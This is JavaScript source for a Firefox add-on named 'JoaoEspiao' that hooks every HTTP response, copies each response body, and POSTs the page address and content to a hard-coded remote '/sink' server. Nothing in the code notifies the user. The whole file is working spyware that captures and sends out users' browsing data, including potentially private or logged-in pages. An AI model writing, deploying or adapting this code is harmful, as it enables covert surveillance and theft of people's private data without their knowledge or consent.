var self = require('sdk/self');

var buttons = require('sdk/ui/button/action');
var tabs = require('sdk/tabs');

let { Cc, Ci} = require('chrome');

function TracingListener(serverAddress) {
    this.serverAddress = "";
}


/**
 * Class that sends captured data off to a remote server.
 * It does not initiate the capture itself.
 */
TracingListener.prototype =
{
  originalListener: null,
  receivedData: null,

  /**
   * Called when next chunk of data may be read
   *
   * @param {nsIRequest} aRequest - indicating source of the data (.name could be the URI)
   * @param aContext - user defined context
   * @param {nsIInputStream} aInputStream - stream from which to read the data
   * @param aOffset - number of bytes previously sent
   * @param aCount - number of bytes available for reading
   */
  onDataAvailable: function(request, context, inputStream, offset, count) {
    try {
      // Read data from stream
      var binaryInputStream = Cc["@mozilla.org/binaryinputstream;1"].createInstance(Ci.nsIBinaryInputStream);
      var storageStream = Cc["@mozilla.org/storagestream;1"].createInstance(Ci.nsIStorageStream);
      var binaryOutputStream = Cc["@mozilla.org/binaryoutputstream;1"].createInstance(Ci.nsIBinaryOutputStream);

      binaryInputStream.setInputStream(inputStream);
      storageStream.init(8192, count, null);
      binaryOutputStream.setOutputStream(storageStream.getOutputStream(0));

      var data = binaryInputStream.readBytes(count);
      binaryOutputStream.writeBytes(data, count);

      this.receivedData.push(data);
    } catch(error) {
      console.log("Error: ", error);
    }

     this.originalListener.onDataAvailable(request, context, storageStream.newInputStream(0), offset, count);
   },

   onStartRequest: function(request, context) {
     this.receivedData = [];
     this.originalListener.onStartRequest(request, context);
   },

  onStopRequest: function(request, context, statusCode) {    
    if(true) {
      var xhr = Cc["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Ci.nsIXMLHttpRequest);      
      console.log("Sending", this.receivedData.length, "bytes of data to server (address: " + this.serverAddress + ")");
      
      try {       
        xhr.open("POST", this.serverAddress, true);

        var response = "Address: " + request.name + "\n\n"

        for(var i = 0; i < this.receivedData.length; i++)
          response += this.receivedData[i];

        response += "\n"
        xhr.send(response);
      } catch(exception) {
        console.log("An exception occured while sending data to server:", exception);
      }
    }

    this.originalListener.onStopRequest(request, context, statusCode);
  },

   QueryInterface: function (aIID) {
       if (aIID.equals(Ci.nsIStreamListener) ||
           aIID.equals(Ci.nsISupports)) {
           return this;
       }
       throw Components.results.NS_NOINTERFACE;
   }
}


/**
 * Main class
 */
function JoaoEspiaoObserver()
{
  this.register();
}


JoaoEspiaoObserver.prototype =
{
  /**
   * Will be called when there is a notification for the registered observer.
   *
   * @param aSubject - Object whose actions are being observed.
   * @param aTopic - Specific change or action
   * @param aData - Auxiliary data describing change or action
   */
  observe: function(aSubject, aTopic, aData)
  {
    // We only registered for one topic, should not get any others
    if(aTopic != "http-on-examine-response")
      return;

    var newListener = new TracingListener();
    newListener.serverAddress = "http://forex.champalimaud.org/sink";      
    
    aSubject.QueryInterface(Ci.nsITraceableChannel);
    newListener.originalListener = aSubject.setNewListener(newListener);        
  },

  register: function() {
    var observerService = Cc["@mozilla.org/observer-service;1"].getService(Ci.nsIObserverService);
    observerService.addObserver(this, "http-on-examine-response", false);
  },

  unregister: function() {
    var observerService = Cc["@mozilla.org/observer-service;1"].getService(Ci.nsIObserverService);
    observerService.removeObserver(this, "http-on-example-response");
  }
};


/**
 * Register the observer
 */
var observer = new JoaoEspiaoObserver();
